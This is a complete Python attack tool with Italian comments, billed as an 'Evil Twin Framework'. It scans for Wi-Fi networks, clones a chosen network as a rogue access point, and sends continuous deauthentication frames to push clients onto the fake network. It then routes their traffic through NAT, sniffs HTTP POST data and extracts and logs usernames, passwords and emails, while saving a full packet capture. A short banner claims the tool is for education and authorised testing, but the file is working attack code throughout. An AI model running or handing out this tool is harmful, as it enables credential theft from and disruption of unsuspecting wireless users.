#!/usr/bin/env python3
"""
EVIL TWIN FRAMEWORK 3.0 - PROFESSIONAL EDITION
- Scansione automatica reti Wi-Fi
- Selezione target interattiva
- Creazione AP falso con airbase-ng
- Internet passthrough (NAT + DHCP)
- Intercettazione traffico HTTP in tempo reale
- Estrazione automatica username/password
- Salvataggio PCAP e log credenziali
- Menu di controllo live
- Cleanup completo automatico

Richiede: 2 interfacce (1 con Internet, 1 wireless per AP)
"""

import os
import sys
import time
import signal
import subprocess
import threading
import re
import netifaces
import tempfile
import glob
import queue
import atexit
from datetime import datetime

# ------------------------- SCAPY (IMPORT GLOBALE) -------------------------
try:
    from scapy.all import *
    from scapy.layers import http
except ImportError:
    print("\n[!] Scapy non installato. Installalo con:")
    print("    sudo apt install python3-scapy")
    print("    sudo pip3 install scapy")
    sys.exit(1)

# --------------------------- CONFIGURAZIONE ---------------------------
VERSION = "3.0"
PCAP_DIR = "/tmp/eviltwin_captures"
LOG_FILE = "/tmp/eviltwin_credentials.log"
CAPTURE_FILE = f"{PCAP_DIR}/victim_traffic.pcap"
INTERCEPT_HTTP = True
SHOW_COOKIES = True
SAVE_PCAP = True

# --------------------------- GLOBALI ---------------------------
internet_iface = None
ap_iface = None
ap_iface_original = None
airbase_pid = None
dnsmasq_pid = None
sniffer_thread = None
cleanup_done = False
at0 = "at0"
stop_sniffer = threading.Event()

# --------------------------- UTILITY ---------------------------
def run_cmd(cmd, capture=True):
    try:
        if capture:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout.strip(), result.stderr.strip(), result.returncode
        else:
            result = subprocess.run(cmd, shell=True)
            return "", "", result.returncode
    except:
        return "", "", -1

def check_root():
    if os.geteuid() != 0:
        print("\n[!] Esegui come root: sudo python3 evil_twin_pro.py\n")
        sys.exit(1)

def check_dependencies():
    deps = ['airbase-ng', 'dnsmasq', 'airodump-ng', 'aireplay-ng', 'tshark']
    missing = []
    for dep in deps:
        _, _, rc = run_cmd(f"which {dep}")
        if rc != 0:
            missing.append(dep)
    if missing:
        print(f"\n[!] Dipendenze mancanti: {', '.join(missing)}")
        print("    Installa con: sudo apt install -y " + " ".join(missing))
        sys.exit(1)

def setup_dirs():
    os.makedirs(PCAP_DIR, exist_ok=True)
    with open(LOG_FILE, 'w') as f:
        f.write(f"=== Evil Twin Credential Log - {datetime.now()} ===\n")
        f.write("Timestamp | Client MAC | Client IP | Host | POST Data\n")
        f.write("-" * 80 + "\n")

def get_default_interface():
    gateways = netifaces.gateways()
    default = gateways.get('default', {})
    return default.get(netifaces.AF_INET, [None, None])[1]

def check_internet(iface):
    print(f"[*] Verifica Internet su {iface}...")
    _, _, rc = run_cmd(f"ping -c 1 -W 2 -I {iface} 8.8.8.8")
    if rc == 0:
        print("    [✓] OK")
        return True
    else:
        print("    [✗] Nessuna connettività")
        return False

def enable_monitor(iface):
    global ap_iface_original
    ap_iface_original = iface
    print(f"[*] Abilito monitor mode su {iface}...")
    run_cmd(f"ip link set {iface} down")
    run_cmd(f"iw {iface} set monitor control")
    run_cmd(f"ip link set {iface} up")
    time.sleep(1)
    out, _, _ = run_cmd(f"iwconfig {iface} | grep -i mode")
    if 'monitor' in out.lower():
        print("    [✓] Fatto")
        return True
    print("    [✗] Fallito")
    return False

def disable_monitor(iface):
    print(f"[*] Ripristino {iface} in managed...")
    run_cmd(f"ip link set {iface} down")
    run_cmd(f"iw {iface} set type managed")
    run_cmd(f"ip link set {iface} up")

def scan_networks(iface, scan_time=8):
    print(f"[*] Scansione reti Wi-Fi ({scan_time} sec)...")
    with tempfile.NamedTemporaryFile(suffix='.csv', delete=False) as tmp:
        csv_base = tmp.name[:-4]
    proc = subprocess.Popen(
        f"airodump-ng {iface} --output-format csv -w {csv_base} --write-interval 1",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(scan_time)
    proc.terminate()
    time.sleep(1)
    networks = []
    csv_files = glob.glob(f"{csv_base}-*.csv")
    if csv_files:
        try:
            with open(csv_files[0], 'r', errors='ignore') as f:
                lines = f.readlines()
            for line in lines:
                if line.startswith('BSSID') or 'Station' in line:
                    continue
                parts = line.split(',')
                if len(parts) > 13:
                    bssid = parts[0].strip()
                    if len(bssid) != 17:
                        continue
                    channel = parts[3].strip()
                    essid = parts[13].strip()
                    power = parts[5].strip() if parts[5].strip() else '0'
                    enc = parts[6].strip() if len(parts) > 6 else ''
                    if essid and essid != '(not associated)':
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid,
                            'power': power,
                            'enc': enc
                        })
        except:
            pass
        for f in glob.glob(f"{csv_base}*"):
            try:
                os.remove(f)
            except:
                pass
    networks.sort(key=lambda x: int(x['power']) if x['power'].isdigit() else 0, reverse=True)
    return networks

def select_target(networks):
    print("\n" + "="*60)
    print("          RETI TROVATE - SELEZIONA TARGET")
    print("="*60)
    for i, net in enumerate(networks, 1):
        print(f"{i:2d}. {net['essid'][:30]:30} CH:{net['channel']:>3}  {net['bssid']}  ({net['enc'] or 'OPEN'})")
    while True:
        try:
            choice = int(input("\n[*] Scegli numero: "))
            if 1 <= choice <= len(networks):
                return networks[choice-1]
        except:
            pass
        print("[!] Numero non valido")

# --------------------------- SNIFFER HTTP ---------------------------
class HTTPCredentialSniffer:
    def __init__(self, interface=at0):
        self.interface = interface
        self.running = False
        self.stats = {'packets': 0, 'http': 0, 'creds': 0, 'clients': set()}
        self.start_time = time.time()

    def get_mac(self, ip):
        if ip.startswith('10.0.0.'):
            out, _, _ = run_cmd(f"arp -n {ip} | grep {ip}")
            m = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', out)
            return m.group(0) if m else 'N/A'
        return 'N/A'

    def packet_handler(self, pkt):
        try:
            self.stats['packets'] += 1
            if SAVE_PCAP:
                wrpcap(CAPTURE_FILE, pkt, append=True)

            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                ip = pkt.getlayer(IP)
                tcp = pkt.getlayer(TCP)
                if tcp.dport == 80 or tcp.sport == 80:
                    self.stats['http'] += 1
                    payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                    client_ip = ip.src if tcp.sport != 80 else ip.dst
                    client_mac = self.get_mac(client_ip)
                    self.stats['clients'].add(client_mac)

                    if payload.startswith('POST'):
                        self.parse_post(payload, client_ip, client_mac)
        except:
            pass

    def parse_post(self, payload, client_ip, client_mac):
        lines = payload.split('\n')
        first = lines[0] if lines else ''
        host = ''
        for l in lines:
            if l.lower().startswith('host:'):
                host = l.split(':', 1)[1].strip()
                break
        post_data = lines[-1].strip() if lines[-1] and '=' in lines[-1] else ''
        if post_data:
            self.stats['creds'] += 1
            timestamp = datetime.now().isoformat()
            with open(LOG_FILE, 'a') as f:
                f.write(f"{timestamp} | {client_mac} | {client_ip} | {host} | {post_data}\n")
            print(f"\n\033[91m╔══════════════════════════════════════════════════════════╗")
            print(f"║  🔐 CREDENZIALI CATTURATE!                               ║")
            print(f"╠══════════════════════════════════════════════════════════╣")
            print(f"║  Cliente: {client_mac} ({client_ip})")
            print(f"║  Target:  {host}")
            print(f"║  Data:    {post_data}")
            print(f"╚══════════════════════════════════════════════════════════╝\033[0m\n")
            self.extract_creds(post_data)

    def extract_creds(self, data):
        patterns = [
            (r'user[name]*[=:]([^&\s]+)', '👤 Username'),
            (r'login[name]*[=:]([^&\s]+)', '👤 Login'),
            (r'email[=:]([^&\s]+@[^&\s]+)', '📧 Email'),
            (r'pass(word)?[=:]([^&\s]+)', '🔑 Password'),
            (r'pwd[=:]([^&\s]+)', '🔑 Password')
        ]
        for pat, label in patterns:
            m = re.search(pat, data, re.I)
            if m:
                val = m.group(1) if len(m.groups()) == 1 else m.group(2)
                print(f"\033[93m     {label}: {val}\033[0m")

    def stats_display(self):
        elapsed = int(time.time() - self.start_time)
        print("\n" + "="*60)
        print(f"📊 STATISTICHE ({datetime.now().strftime('%H:%M:%S')})")
        print("="*60)
        print(f"   Pacchetti: {self.stats['packets']}")
        print(f"   HTTP:      {self.stats['http']}")
        print(f"   Creds:     {self.stats['creds']}")
        print(f"   Clienti:   {len(self.stats['clients'])}")
        print(f"   Tempo:     {elapsed} sec")
        print(f"   PCAP:      {CAPTURE_FILE if SAVE_PCAP else 'no'}")
        print(f"   Log:       {LOG_FILE}")
        print("="*60)

    def start(self):
        self.running = True
        print(f"\n\033[92m[*] Sniffing HTTP su {self.interface}...\033[0m")
        print(f"[*] Log: {LOG_FILE}")
        if SAVE_PCAP:
            print(f"[*] PCAP: {CAPTURE_FILE}")
        sniff(iface=self.interface, prn=self.packet_handler, store=False, stop_filter=lambda x: not self.running)

    def stop(self):
        self.running = False
        self.stats_display()

# --------------------------- EVIL TWIN CORE ---------------------------
class EvilTwin:
    def __init__(self, internet, ap, target):
        self.inet = internet
        self.ap = ap
        self.target = target
        self.at0 = "at0"
        self.airbase = None
        self.dnsmasq = None

    def start_airbase(self):
        global airbase_pid
        ssid = self.target['essid']
        ch = self.target['channel']
        print(f"\n[*] Avvio AP falso: '{ssid}' (canale {ch})...")
        proc = subprocess.Popen(
            f"airbase-ng -e '{ssid}' -c {ch} {self.ap}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        self.airbase = proc.pid
        airbase_pid = proc.pid
        for _ in range(10):
            time.sleep(1)
            if os.path.exists(f"/sys/class/net/{self.at0}"):
                print(f"    [✓] Interfaccia {self.at0} pronta")
                return True
        print("    [✗] Errore creazione at0")
        return False

    def config_network(self):
        print("\n[*] Configurazione rete...")
        run_cmd(f"ifconfig {self.at0} up")
        run_cmd(f"ifconfig {self.at0} 10.0.0.1 netmask 255.255.255.0")
        run_cmd(f"route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1")
        print("    [✓] IP 10.0.0.1 su at0")

        run_cmd("sysctl -w net.ipv4.ip_forward=1")
        print("    [✓] IP forwarding")

        run_cmd(f"iptables -t nat -D POSTROUTING -o {self.inet} -j MASQUERADE 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {self.at0} -o {self.inet} -j ACCEPT 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {self.inet} -o {self.at0} -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null")
        run_cmd(f"iptables -t nat -A POSTROUTING -o {self.inet} -j MASQUERADE")
        run_cmd(f"iptables -A FORWARD -i {self.at0} -o {self.inet} -j ACCEPT")
        run_cmd(f"iptables -A FORWARD -i {self.inet} -o {self.at0} -m state --state RELATED,ESTABLISHED -j ACCEPT")
        run_cmd("iptables -P FORWARD ACCEPT")
        print("    [✓] iptables (NAT)")

    def start_dnsmasq(self):
        global dnsmasq_pid
        print("\n[*] Avvio dnsmasq (DHCP+DNS)...")
        conf = f"""/tmp/eviltwin_dnsmasq.conf
interface={self.at0}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,8.8.8.8
no-resolv
log-queries
log-dhcp
"""
        with open("/tmp/eviltwin_dnsmasq.conf", "w") as f:
            f.write(conf)
        run_cmd("pkill -f 'dnsmasq.*at0' 2>/dev/null")
        proc = subprocess.Popen(
            "dnsmasq -C /tmp/eviltwin_dnsmasq.conf -d",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        self.dnsmasq = proc.pid
        dnsmasq_pid = proc.pid
        print(f"    [✓] dnsmasq PID {self.dnsmasq}")

    def deauth(self, bssid=None, client=None):
        if not bssid:
            bssid = self.target['bssid']
        print(f"\n[*] Deauth attack su {bssid}...")
        cmd = f"aireplay-ng --deauth 0 -a {bssid} {self.ap}"
        if client:
            cmd += f" -c {client}"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("    [✓] In esecuzione")

# --------------------------- CLEANUP ---------------------------
def cleanup():
    global cleanup_done, airbase_pid, dnsmasq_pid, sniffer_thread, stop_sniffer
    if cleanup_done:
        return
    print("\n\n[*] PULIZIA IN CORSO...")
    stop_sniffer.set()
    if sniffer_thread and sniffer_thread.is_alive():
        sniffer_thread.join(2)
    if airbase_pid:
        run_cmd(f"kill -9 {airbase_pid} 2>/dev/null")
    if dnsmasq_pid:
        run_cmd(f"kill -9 {dnsmasq_pid} 2>/dev/null")
    time.sleep(1)
    if internet_iface:
        run_cmd(f"iptables -t nat -D POSTROUTING -o {internet_iface} -j MASQUERADE 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {at0} -o {internet_iface} -j ACCEPT 2>/dev/null")
        run_cmd(f"iptables -D FORWARD -i {internet_iface} -o {at0} -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null")
    run_cmd("sysctl -w net.ipv4.ip_forward=0")
    if ap_iface_original:
        disable_monitor(ap_iface_original)
    run_cmd(f"ip link set {at0} down 2>/dev/null")
    run_cmd(f"iw dev {at0} del 2>/dev/null")
    run_cmd("systemctl restart NetworkManager 2>/dev/null")
    run_cmd("rfkill unblock wifi")
    print("\033[92m[✓] PULIZIA COMPLETATA\033[0m")
    print(f"\n📁 Log credenziali: {LOG_FILE}")
    if SAVE_PCAP and os.path.exists(CAPTURE_FILE):
        size = os.path.getsize(CAPTURE_FILE) // 1024
        print(f"📁 Capture PCAP:    {CAPTURE_FILE} ({size} KB)")
    cleanup_done = True

def signal_handler(sig, frame):
    print("\n\n[!] Interruzione richiesta")
    cleanup()
    sys.exit(0)

# --------------------------- MAIN ---------------------------
def main():
    global internet_iface, ap_iface, sniffer_thread, stop_sniffer

    # BANNER
    print(f"""
\033[92m
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     ███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗
║     ██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║
║     █████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║
║     ██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║
║     ███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║
║     ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
║                                                              ║
║              EVIL TWIN FRAMEWORK {VERSION}                     ║
║         Professional Wireless Penetration Testing Tool        ║
║                                                              ║
║     ⚠️  SOLO USO EDUCATIVO E TEST AUTORIZZATI ⚠️             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
\033[0m""")

    check_root()
    check_dependencies()
    setup_dirs()
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # INTERFACCIA INTERNET
    default = get_default_interface()
    print(f"\n[+] Interfaccia con Internet rilevata: {default}")
    if input("Usare questa? (S/n): ").lower() == 'n':
        internet_iface = input("Inserisci nome interfaccia Internet: ").strip()
    else:
        internet_iface = default
    if internet_iface not in netifaces.interfaces():
        print(f"[!] {internet_iface} non esiste")
        sys.exit(1)
    if not check_internet(internet_iface):
        print("[!] Nessuna connettività Internet")
        sys.exit(1)

    # INTERFACCIA WIRELESS PER AP
    out, _, _ = run_cmd("iw dev | grep Interface | awk '{print $2}'")
    wlans = out.splitlines()
    if not wlans:
        print("[!] Nessuna interfaccia wireless trovata")
        sys.exit(1)
    print("\n--- INTERFACCE WIRELESS ---")
    for i, w in enumerate(wlans, 1):
        print(f"  {i}. {w}")
    try:
        idx = int(input("\nScegli interfaccia per AP falso: "))
        ap_iface = wlans[idx-1]
    except:
        print("[!] Scelta non valida")
        sys.exit(1)

    # SCANSIONE TARGET
    if not enable_monitor(ap_iface):
        sys.exit(1)
    nets = scan_networks(ap_iface, 8)
    if not nets:
        print("[!] Nessuna rete trovata")
        disable_monitor(ap_iface)
        sys.exit(1)
    target = select_target(nets)

    print(f"\n\033[92m[✓] TARGET: {target['essid']} ({target['bssid']})\033[0m")

    # AVVIO EVIL TWIN
    twin = EvilTwin(internet_iface, ap_iface, target)
    if not twin.start_airbase():
        cleanup()
        sys.exit(1)
    twin.config_network()
    twin.start_dnsmasq()

    print(f"\n\033[92m[✓] EVIL TWIN ATTIVO: '{target['essid']}' (CH {target['channel']})\033[0m")
    print(f"    Gateway: 10.0.0.1 | DHCP: 10.0.0.10-100 | DNS: 8.8.8.8\n")

    if input("Eseguire deauth attack? (s/N): ").lower() == 's':
        client = input("Client specifico? (MAC / INVIO per broadcast): ").strip()
        twin.deauth(client=client if client else None)

    # AVVIO SNIFFER
    stop_sniffer.clear()
    sniffer = HTTPCredentialSniffer(at0)
    sniffer_thread = threading.Thread(target=sniffer.start, daemon=True)
    sniffer_thread.start()

    # MENU
    print("\n\033[93m" + "="*60)
    print("          🎯 MODALITÀ INTERCETTAZIONE ATTIVA 🎯")
    print("="*60)
    print("   [1] Mostra statistiche")
    print("   [2] Mostra ultime credenziali")
    print("   [3] Apri log file")
    print("   [4] Riavvia deauth")
    print("   [5] Ferma e pulisci")
    print("="*60 + "\033[0m\n")

    try:
        while True:
            cmd = input("evil-twin> ").strip()
            if cmd == '1':
                sniffer.stats_display()
            elif cmd == '2':
                print("\n--- ULTIME 20 CREDENZIALI ---")
                run_cmd(f"tail -20 {LOG_FILE}")
            elif cmd == '3':
                os.system(f"less {LOG_FILE}")
            elif cmd == '4':
                twin.deauth()
            elif cmd == '5':
                break
            elif cmd == '':
                continue
            else:
                print("[!] Comando non valido")
    except KeyboardInterrupt:
        pass

    cleanup()
    print("[✓] Uscita.")

if __name__ == "__main__":
    main()